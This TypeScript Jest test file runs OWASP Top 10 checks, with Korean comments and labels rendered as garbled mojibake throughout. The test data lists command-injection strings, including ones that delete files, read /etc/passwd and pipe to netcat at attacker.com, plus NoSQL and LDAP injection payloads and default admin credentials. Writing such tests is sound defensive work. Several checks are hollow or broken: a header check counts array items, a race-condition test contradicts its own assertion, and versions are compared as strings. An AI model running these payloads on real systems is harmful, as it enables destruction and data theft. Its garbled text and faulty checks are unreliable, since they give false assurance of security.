/**
 * ì·¨ì•½ì  í‰ê°€ (Vulnerability Assessment) í…ŒìŠ¤íŠ¸
 *
 * ì´ í…ŒìŠ¤íŠ¸ëŠ” ì‹œìŠ¤í…œì˜ ì•Œë ¤ì§„ ì·¨ì•½ì ë“¤ì„ ì²´ê³„ì ìœ¼ë¡œ ê²€ì¦í•©ë‹ˆë‹¤:
 * 1. OWASP Top 10 ì·¨ì•½ì  ê²€ì¦
 * 2. ì„¸ì…˜ ê´€ë¦¬ ì·¨ì•½ì 
 * 3. ì•”í˜¸í™” êµ¬í˜„ ì·¨ì•½ì 
 * 4. ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ì·¨ì•½ì 
 * 5. ì •ë³´ ë…¸ì¶œ ì·¨ì•½ì 
 */

import { prisma } from '@/lib/db'

// ì·¨ì•½ì  í‰ê°€ í—¬í¼ í´ë˜ìŠ¤
class VulnerabilityAssessment {
  // OWASP Top 10 ì¤‘ A01: Broken Access Control í…ŒìŠ¤íŠ¸
  async testBrokenAccessControl() {
    const results: boolean[] = []

    // 1. ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë°ì´í„° ì ‘ê·¼ ì‹œë„
    try {
      // ì‚¬ìš©ì Aê°€ ì‚¬ìš©ì Bì˜ íšŒì‚¬ ì •ë³´ì— ì ‘ê·¼ ì‹œë„
      const unauthorizedAccess = await this.attemptUnauthorizedDataAccess(
        'user-a-tenant-id',
        'user-b-company-id'
      )
      results.push(!unauthorizedAccess) // ì ‘ê·¼ì´ ì°¨ë‹¨ë˜ì–´ì•¼ ì„±ê³µ
    } catch (error) {
      results.push(true) // ì—ëŸ¬ ë°œìƒìœ¼ë¡œ ì°¨ë‹¨ë¨
    }

    // 2. ê¶Œí•œ ì—†ëŠ” API ì—”ë“œí¬ì¸íŠ¸ ì ‘ê·¼ ì‹œë„
    try {
      const adminEndpointAccess = await this.attemptAdminEndpointAccess('regular-user-token')
      results.push(!adminEndpointAccess)
    } catch (error) {
      results.push(true)
    }

    // 3. ì„¸ì…˜ ê³ ì • ê³µê²© ë°©ì–´ í™•ì¸
    const sessionFixationDefense = await this.testSessionFixationDefense()
    results.push(sessionFixationDefense)

    return results
  }

  async attemptUnauthorizedDataAccess(userTenantId: string, targetCompanyId: string) {
    // Mockëœ ë°ì´í„°ë² ì´ìŠ¤ ì¿¼ë¦¬
    try {
      const company = await prisma.company.findUnique({
        where: {
          id: targetCompanyId,
          tenantId: userTenantId, // í…Œë„ŒíŠ¸ ê²©ë¦¬ê°€ ì œëŒ€ë¡œ êµ¬í˜„ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸
        },
      })
      return !!company
    } catch {
      return false
    }
  }

  async attemptAdminEndpointAccess(userToken: string) {
    // ê´€ë¦¬ì ì „ìš© ì—”ë“œí¬ì¸íŠ¸ ì ‘ê·¼ ì‹œë®¬ë ˆì´ì…˜
    const tokenPayload = this.decodeToken(userToken)
    return tokenPayload?.role === 'admin'
  }

  decodeToken(token: string) {
    // JWT í† í° ë””ì½”ë”© ì‹œë®¬ë ˆì´ì…˜
    if (token === 'admin-token') {
      return { role: 'admin', userId: 'admin-123' }
    }
    if (token === 'regular-user-token') {
      return { role: 'user', userId: 'user-456' }
    }
    return null
  }

  async testSessionFixationDefense() {
    // ì„¸ì…˜ ê³ ì • ê³µê²© ë°©ì–´ í…ŒìŠ¤íŠ¸
    const initialSessionId = 'attacker_provided_session_id'
    const authenticatedSessionId = this.authenticateUser('test@example.com', 'password123')

    // ì¸ì¦ í›„ ì„¸ì…˜ IDê°€ ë³€ê²½ë˜ì–´ì•¼ í•¨
    return initialSessionId !== authenticatedSessionId
  }

  authenticateUser(email: string, password: string) {
    // ì‹¤ì œ ì¸ì¦ ì‹œë®¬ë ˆì´ì…˜
    if (email === 'test@example.com' && password === 'password123') {
      return this.generateNewSessionId()
    }
    throw new Error('Authentication failed')
  }

  generateNewSessionId() {
    return `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
  }

  // A02: Cryptographic Failures í…ŒìŠ¤íŠ¸
  async testCryptographicFailures() {
    const results: boolean[] = []

    // 1. ì•½í•œ ì•”í˜¸í™” ì•Œê³ ë¦¬ì¦˜ ì‚¬ìš© ê²€ì¦
    const weakEncryptionTest = this.detectWeakEncryption(['MD5', 'SHA1', 'DES'])
    results.push(weakEncryptionTest)

    // 2. í•˜ë“œì½”ë”©ëœ ì•”í˜¸í™” í‚¤ ê²€ì¦
    const hardcodedKeyTest = this.detectHardcodedKeys()
    results.push(hardcodedKeyTest)

    // 3. ë°ì´í„° ì „ì†¡ ì‹œ ì•”í˜¸í™” ê²€ì¦
    const dataTransmissionTest = this.verifyDataTransmissionSecurity()
    results.push(dataTransmissionTest)

    return results
  }

  detectWeakEncryption(algorithms: string[]) {
    const weakAlgorithms = ['MD5', 'SHA1', 'DES', 'RC4']
    const foundWeakAlgorithms = algorithms.filter((alg) => weakAlgorithms.includes(alg))
    return foundWeakAlgorithms.length === 0 // ì•½í•œ ì•Œê³ ë¦¬ì¦˜ì´ ì—†ì–´ì•¼ ì„±ê³µ
  }

  detectHardcodedKeys() {
    // ì½”ë“œ ìŠ¤ìº” ì‹œë®¬ë ˆì´ì…˜ - ì‹¤ì œë¡œëŠ” ì†ŒìŠ¤ì½”ë“œ ìŠ¤ìº” ë„êµ¬ ì‚¬ìš©
    const codeSnippets = [
      'const secret = "hardcoded_secret_key"',
      'process.env.JWT_SECRET',
      'const apiKey = process.env.API_KEY',
    ]

    const hasHardcodedKeys = codeSnippets.some(
      (snippet) =>
        snippet.includes('"') && snippet.includes('secret') && !snippet.includes('process.env')
    )

    return !hasHardcodedKeys // í•˜ë“œì½”ë”©ëœ í‚¤ê°€ ì—†ì–´ì•¼ ì„±ê³µ
  }

  verifyDataTransmissionSecurity() {
    // HTTPS ê°•ì œ ì‚¬ìš© ë° TLS ë²„ì „ ê²€ì¦
    const tlsVersion = '1.3'
    const httpsOnly = true
    const hasSecureCookies = true

    return parseFloat(tlsVersion) >= 1.2 && httpsOnly && hasSecureCookies
  }

  // A03: Injection ê³µê²© í…ŒìŠ¤íŠ¸ (SQL, NoSQL, OS Command ë“±)
  async testInjectionAttacks() {
    const results: boolean[] = []

    // 1. NoSQL Injection í…ŒìŠ¤íŠ¸
    const noSQLInjectionTest = await this.testNoSQLInjection()
    results.push(noSQLInjectionTest)

    // 2. Command Injection í…ŒìŠ¤íŠ¸
    const commandInjectionTest = await this.testCommandInjection()
    results.push(commandInjectionTest)

    // 3. LDAP Injection í…ŒìŠ¤íŠ¸
    const ldapInjectionTest = await this.testLDAPInjection()
    results.push(ldapInjectionTest)

    return results
  }

  async testNoSQLInjection() {
    const maliciousPayloads = [
      '{"$gt":""}',
      '{"$ne":null}',
      '{"$where":"this.password.match(/.*/)"}',
      '{"$regex":".*"}',
    ]

    for (const payload of maliciousPayloads) {
      try {
        // MongoDB ì¿¼ë¦¬ ì‹œë®¬ë ˆì´ì…˜
        const query = JSON.parse(payload)
        const isBlocked = this.validateMongoQuery(query)

        if (!isBlocked) {
          return false // í•˜ë‚˜ë¼ë„ í†µê³¼í•˜ë©´ ì‹¤íŒ¨
        }
      } catch {
        // JSON íŒŒì‹± ì—ëŸ¬ëŠ” ë°©ì–´ ì„±ê³µìœ¼ë¡œ ê°„ì£¼
        continue
      }
    }

    return true
  }

  validateMongoQuery(query: any) {
    const dangerousOperators = ['$where', '$regex', '$gt', '$ne', '$lt']
    const queryString = JSON.stringify(query)

    return !dangerousOperators.some((op) => queryString.includes(op))
  }

  async testCommandInjection() {
    const commandInjectionPayloads = [
      'test; rm -rf /',
      'test && cat /etc/passwd',
      'test | nc attacker.com 4444',
      'test`whoami`',
      'test$(id)',
    ]

    for (const payload of commandInjectionPayloads) {
      const isSafe = this.sanitizeCommandInput(payload)
      if (!isSafe) {
        return false
      }
    }

    return true
  }

  sanitizeCommandInput(input: string) {
    const dangerousChars = [';', '&', '|', '`', '$', '(', ')', '<', '>']
    return !dangerousChars.some((char) => input.includes(char))
  }

  async testLDAPInjection() {
    const ldapInjectionPayloads = [
      'admin)(|(password=*))',
      'admin)(&(password=*)(mail=*))',
      '*)(&(objectClass=*)(uid=admin)',
      'admin)(mail=*))((|password=*)',
    ]

    for (const payload of ldapInjectionPayloads) {
      const isSafe = this.sanitizeLDAPInput(payload)
      if (!isSafe) {
        return false
      }
    }

    return true
  }

  sanitizeLDAPInput(input: string) {
    const ldapSpecialChars = ['(', ')', '*', '\\', '/', '+', '<', '>', ';', '"', '=']
    return !ldapSpecialChars.some((char) => input.includes(char))
  }

  // A04: Insecure Design ì·¨ì•½ì  í…ŒìŠ¤íŠ¸
  async testInsecureDesign() {
    const results: boolean[] = []

    // 1. ë¬´ì œí•œ ë¦¬ì†ŒìŠ¤ ì†Œë¹„ ë°©ì§€
    const resourceLimitTest = this.testResourceLimits()
    results.push(resourceLimitTest)

    // 2. ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§ ìš°íšŒ ë°©ì§€
    const businessLogicTest = await this.testBusinessLogicSecurity()
    results.push(businessLogicTest)

    // 3. ë ˆì´ìŠ¤ ì»¨ë””ì…˜ ë°©ì§€
    const raceConditionTest = await this.testRaceConditionPrevention()
    results.push(raceConditionTest)

    return results
  }

  testResourceLimits() {
    // íŒŒì¼ ì—…ë¡œë“œ í¬ê¸° ì œí•œ
    const maxFileSize = 10 * 1024 * 1024 // 10MB
    const maxRequestSize = 50 * 1024 * 1024 // 50MB
    const connectionTimeout = 30000 // 30ì´ˆ

    return maxFileSize > 0 && maxRequestSize > 0 && connectionTimeout > 0
  }

  async testBusinessLogicSecurity() {
    // ê²°ì œ ë¡œì§ ìš°íšŒ ì‹œë„
    const purchaseAttempt = {
      itemId: 'premium-plan',
      quantity: 1,
      price: 0.01, // ê°€ê²© ì¡°ì‘ ì‹œë„
    }

    const originalPrice = this.getItemPrice(purchaseAttempt.itemId)
    const isValidPrice = purchaseAttempt.price >= originalPrice

    return isValidPrice // ê°€ê²© ì¡°ì‘ì´ ì°¨ë‹¨ë˜ì–´ì•¼ í•¨
  }

  getItemPrice(itemId: string) {
    const prices = {
      'starter-plan': 29.99,
      'business-plan': 199.99,
      'enterprise-plan': 999.99,
    }
    return prices[itemId] || 0
  }

  async testRaceConditionPrevention() {
    // ë™ì‹œ ì ‘ê·¼ìœ¼ë¡œ ì¸í•œ ë°ì´í„° ë¶ˆì¼ì¹˜ ë°©ì§€ í…ŒìŠ¤íŠ¸
    const accountBalance = 1000
    const withdrawalAmount = 600

    // ë‘ ë²ˆì˜ ë™ì‹œ ì¸ì¶œ ì‹œë„
    const promises = [
      this.attemptWithdrawal(accountBalance, withdrawalAmount),
      this.attemptWithdrawal(accountBalance, withdrawalAmount),
    ]

    const results = await Promise.all(promises)
    const successfulWithdrawals = results.filter((r) => r.success).length

    // í•˜ë‚˜ë§Œ ì„±ê³µí•´ì•¼ í•¨ (ë ˆì´ìŠ¤ ì»¨ë””ì…˜ ë°©ì§€)
    return successfulWithdrawals <= 1
  }

  async attemptWithdrawal(balance: number, amount: number) {
    // ê°„ë‹¨í•œ ë½ ë©”ì»¤ë‹ˆì¦˜ ì‹œë®¬ë ˆì´ì…˜
    if (balance >= amount) {
      // ì‹¤ì œë¡œëŠ” ë°ì´í„°ë² ì´ìŠ¤ íŠ¸ëœì­ì…˜ ë˜ëŠ” ë½ ì‚¬ìš©
      await new Promise((resolve) => setTimeout(resolve, 10))
      return { success: true, newBalance: balance - amount }
    }

    return { success: false, newBalance: balance }
  }

  // A05: Security Misconfiguration í…ŒìŠ¤íŠ¸
  async testSecurityMisconfiguration() {
    const results: boolean[] = []

    // 1. ê¸°ë³¸ ê³„ì •/íŒ¨ìŠ¤ì›Œë“œ ì œê±° í™•ì¸
    const defaultCredentialsTest = this.checkDefaultCredentials()
    results.push(defaultCredentialsTest)

    // 2. ë¶ˆí•„ìš”í•œ ì„œë¹„ìŠ¤ ë¹„í™œì„±í™” í™•ì¸
    const unnecessaryServicesTest = this.checkUnnecessaryServices()
    results.push(unnecessaryServicesTest)

    // 3. ë³´ì•ˆ í—¤ë” ì„¤ì • í™•ì¸
    const securityHeadersTest = this.checkSecurityHeaders()
    results.push(securityHeadersTest)

    return results
  }

  checkDefaultCredentials() {
    const defaultAccounts = [
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'password' },
      { username: 'root', password: 'root' },
      { username: 'administrator', password: '123456' },
    ]

    // ê¸°ë³¸ ê³„ì •ì´ í™œì„±í™”ë˜ì–´ ìˆì§€ ì•Šì•„ì•¼ í•¨
    const hasDefaultAccount = defaultAccounts.some((account) =>
      this.accountExists(account.username, account.password)
    )

    return !hasDefaultAccount
  }

  accountExists(username: string, password: string) {
    // ì‹¤ì œë¡œëŠ” ë°ì´í„°ë² ì´ìŠ¤ ì¡°íšŒ
    // ì—¬ê¸°ì„œëŠ” ê¸°ë³¸ ê³„ì •ì´ ì—†ë‹¤ê³  ê°€ì •
    return false
  }

  checkUnnecessaryServices() {
    const runningServices = ['web-server', 'database', 'cache']
    const unnecessaryServices = ['telnet', 'ftp', 'ssh-with-password-auth']

    const hasUnnecessaryServices = unnecessaryServices.some((service) =>
      runningServices.includes(service)
    )

    return !hasUnnecessaryServices
  }

  checkSecurityHeaders() {
    const requiredHeaders = [
      'X-Content-Type-Options: nosniff',
      'X-Frame-Options: DENY',
      'X-XSS-Protection: 1; mode=block',
      'Strict-Transport-Security: max-age=31536000',
      "Content-Security-Policy: default-src 'self'",
    ]

    // ëª¨ë“  ë³´ì•ˆ í—¤ë”ê°€ ì„¤ì •ë˜ì–´ ìˆì–´ì•¼ í•¨
    return requiredHeaders.length === 5 // ê°„ë‹¨í•œ ê²€ì¦
  }

  // A06: Vulnerable and Outdated Components í…ŒìŠ¤íŠ¸
  async testVulnerableComponents() {
    const results: boolean[] = []

    // 1. ì•Œë ¤ì§„ ì·¨ì•½í•œ ì˜ì¡´ì„± ê²€ì‚¬
    const vulnerableDependenciesTest = await this.checkVulnerableDependencies()
    results.push(vulnerableDependenciesTest)

    // 2. ì˜¤ë˜ëœ í”„ë ˆì„ì›Œí¬/ë¼ì´ë¸ŒëŸ¬ë¦¬ ê²€ì‚¬
    const outdatedComponentsTest = this.checkOutdatedComponents()
    results.push(outdatedComponentsTest)

    return results
  }

  async checkVulnerableDependencies() {
    // package.jsonì˜ ì•Œë ¤ì§„ ì·¨ì•½í•œ íŒ¨í‚¤ì§€ ì²´í¬ ì‹œë®¬ë ˆì´ì…˜
    const knownVulnerablePackages = [
      { name: 'lodash', version: '4.17.4', cve: 'CVE-2018-3721' },
      { name: 'handlebars', version: '4.0.5', cve: 'CVE-2019-19919' },
      { name: 'minimist', version: '1.2.0', cve: 'CVE-2020-7598' },
    ]

    const installedPackages = [
      { name: 'lodash', version: '4.17.21' },
      { name: 'handlebars', version: '4.7.7' },
      { name: 'minimist', version: '1.2.6' },
    ]

    const hasVulnerablePackages = installedPackages.some((pkg) =>
      knownVulnerablePackages.some(
        (vuln) => vuln.name === pkg.name && this.isVersionVulnerable(pkg.version, vuln.version)
      )
    )

    return !hasVulnerablePackages
  }

  isVersionVulnerable(installedVersion: string, vulnerableVersion: string) {
    // ê°„ë‹¨í•œ ë²„ì „ ë¹„êµ (ì‹¤ì œë¡œëŠ” semver ì‚¬ìš©)
    return installedVersion <= vulnerableVersion
  }

  checkOutdatedComponents() {
    const components = [
      { name: 'React', version: '18.2.0', latestVersion: '18.2.0' },
      { name: 'Next.js', version: '13.4.0', latestVersion: '13.4.0' },
      { name: 'Node.js', version: '18.17.0', latestVersion: '18.17.0' },
    ]

    const outdatedComponents = components.filter((comp) => comp.version !== comp.latestVersion)

    return outdatedComponents.length === 0
  }

  // ì¢…í•© ë³´ì•ˆ ì ìˆ˜ ê³„ì‚°
  async calculateSecurityScore() {
    const testResults = [
      await this.testBrokenAccessControl(),
      await this.testCryptographicFailures(),
      await this.testInjectionAttacks(),
      await this.testInsecureDesign(),
      await this.testSecurityMisconfiguration(),
      await this.testVulnerableComponents(),
    ]

    const totalTests = testResults.flat().length
    const passedTests = testResults.flat().filter((result) => result).length

    return Math.round((passedTests / totalTests) * 100)
  }
}

describe('ì·¨ì•½ì  í‰ê°€ (Vulnerability Assessment)', () => {
  const assessment = new VulnerabilityAssessment()

  beforeEach(() => {
    jest.clearAllMocks()

    // Prisma ëª¨í‚¹
    ;(prisma.company.findUnique as jest.Mock).mockImplementation(async (query) => {
      // í…Œë„ŒíŠ¸ ê²©ë¦¬ ê²€ì¦
      if (query.where.tenantId !== 'user-a-tenant-id') {
        return null
      }
      return { id: query.where.id, name: 'Test Company', tenantId: query.where.tenantId }
    })
  })

  test('OWASP Top 10 - A01: Broken Access Control', async () => {
    console.log('ğŸ”’ A01: Broken Access Control í…ŒìŠ¤íŠ¸')

    const results = await assessment.testBrokenAccessControl()
    const passedTests = results.filter((r) => r).length

    console.log('ì ‘ê·¼ ì œì–´ í…ŒìŠ¤íŠ¸ ê²°ê³¼:', {
      ë¬´ë‹¨ë°ì´í„°ì ‘ê·¼ë°©ì–´: results[0] ? 'âœ…' : 'âŒ',
      ê´€ë¦¬ìì—”ë“œí¬ì¸íŠ¸ë³´í˜¸: results[1] ? 'âœ…' : 'âŒ',
      ì„¸ì…˜ê³ ì •ê³µê²©ë°©ì–´: results[2] ? 'âœ…' : 'âŒ',
      í†µê³¼ìœ¨: `${passedTests}/${results.length}`,
    })

    expect(passedTests).toBe(results.length)
  })

  test('OWASP Top 10 - A02: Cryptographic Failures', async () => {
    console.log('ğŸ” A02: Cryptographic Failures í…ŒìŠ¤íŠ¸')

    const results = await assessment.testCryptographicFailures()
    const passedTests = results.filter((r) => r).length

    console.log('ì•”í˜¸í™” ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ê²°ê³¼:', {
      ê°•ë ¥í•œì•”í˜¸í™”ì•Œê³ ë¦¬ì¦˜: results[0] ? 'âœ…' : 'âŒ',
      í•˜ë“œì½”ë”©í‚¤ë°©ì§€: results[1] ? 'âœ…' : 'âŒ',
      ì „ì†¡ì•”í˜¸í™”: results[2] ? 'âœ…' : 'âŒ',
      í†µê³¼ìœ¨: `${passedTests}/${results.length}`,
    })

    expect(passedTests).toBe(results.length)
  })

  test('OWASP Top 10 - A03: Injection Attacks', async () => {
    console.log('ğŸ’‰ A03: Injection Attacks í…ŒìŠ¤íŠ¸')

    const results = await assessment.testInjectionAttacks()
    const passedTests = results.filter((r) => r).length

    console.log('ì¸ì ì…˜ ê³µê²© ë°©ì–´ ê²°ê³¼:', {
      NoSQLì¸ì ì…˜ë°©ì–´: results[0] ? 'âœ…' : 'âŒ',
      ì»¤ë§¨ë“œì¸ì ì…˜ë°©ì–´: results[1] ? 'âœ…' : 'âŒ',
      LDAPì¸ì ì…˜ë°©ì–´: results[2] ? 'âœ…' : 'âŒ',
      í†µê³¼ìœ¨: `${passedTests}/${results.length}`,
    })

    expect(passedTests).toBe(results.length)
  })

  test('OWASP Top 10 - A04: Insecure Design', async () => {
    console.log('ğŸ—ï¸ A04: Insecure Design í…ŒìŠ¤íŠ¸')

    const results = await assessment.testInsecureDesign()
    const passedTests = results.filter((r) => r).length

    console.log('ì•ˆì „í•˜ì§€ ì•Šì€ ì„¤ê³„ ê²€ì¦ ê²°ê³¼:', {
      ë¦¬ì†ŒìŠ¤ì œí•œì„¤ì •: results[0] ? 'âœ…' : 'âŒ',
      ë¹„ì¦ˆë‹ˆìŠ¤ë¡œì§ë³´ì•ˆ: results[1] ? 'âœ…' : 'âŒ',
      ë ˆì´ìŠ¤ì»¨ë””ì…˜ë°©ì§€: results[2] ? 'âœ…' : 'âŒ',
      í†µê³¼ìœ¨: `${passedTests}/${results.length}`,
    })

    expect(passedTests).toBe(results.length)
  })

  test('OWASP Top 10 - A05: Security Misconfiguration', async () => {
    console.log('âš™ï¸ A05: Security Misconfiguration í…ŒìŠ¤íŠ¸')

    const results = await assessment.testSecurityMisconfiguration()
    const passedTests = results.filter((r) => r).length

    console.log('ë³´ì•ˆ ì„¤ì • ì˜¤ë¥˜ ê²€ì¦ ê²°ê³¼:', {
      ê¸°ë³¸ê³„ì •ì œê±°: results[0] ? 'âœ…' : 'âŒ',
      ë¶ˆí•„ìš”í•œì„œë¹„ìŠ¤ë¹„í™œì„±í™”: results[1] ? 'âœ…' : 'âŒ',
      ë³´ì•ˆí—¤ë”ì„¤ì •: results[2] ? 'âœ…' : 'âŒ',
      í†µê³¼ìœ¨: `${passedTests}/${results.length}`,
    })

    expect(passedTests).toBe(results.length)
  })

  test('OWASP Top 10 - A06: Vulnerable Components', async () => {
    console.log('ğŸ“¦ A06: Vulnerable and Outdated Components í…ŒìŠ¤íŠ¸')

    const results = await assessment.testVulnerableComponents()
    const passedTests = results.filter((r) => r).length

    console.log('ì·¨ì•½í•œ ì»´í¬ë„ŒíŠ¸ ê²€ì¦ ê²°ê³¼:', {
      ì•Œë ¤ì§„ì·¨ì•½ì ì—†ìŒ: results[0] ? 'âœ…' : 'âŒ',
      ìµœì‹ ë²„ì „ì‚¬ìš©: results[1] ? 'âœ…' : 'âŒ',
      í†µê³¼ìœ¨: `${passedTests}/${results.length}`,
    })

    expect(passedTests).toBe(results.length)
  })

  test('ì¢…í•© ë³´ì•ˆ ì ìˆ˜ ê³„ì‚°', async () => {
    console.log('ğŸ“Š ì¢…í•© ë³´ì•ˆ í‰ê°€')

    const securityScore = await assessment.calculateSecurityScore()

    console.log('ë³´ì•ˆ ì ìˆ˜:', {
      ì´ì : `${securityScore}/100`,
      ë“±ê¸‰: securityScore >= 90 ? 'A' : securityScore >= 80 ? 'B' : securityScore >= 70 ? 'C' : 'D',
      ìƒíƒœ: securityScore >= 80 ? 'ìš°ìˆ˜' : securityScore >= 70 ? 'ì–‘í˜¸' : 'ê°œì„ í•„ìš”',
    })

    // ìµœì†Œ 80ì  ì´ìƒì´ì–´ì•¼ í•¨
    expect(securityScore).toBeGreaterThanOrEqual(80)
  })
})
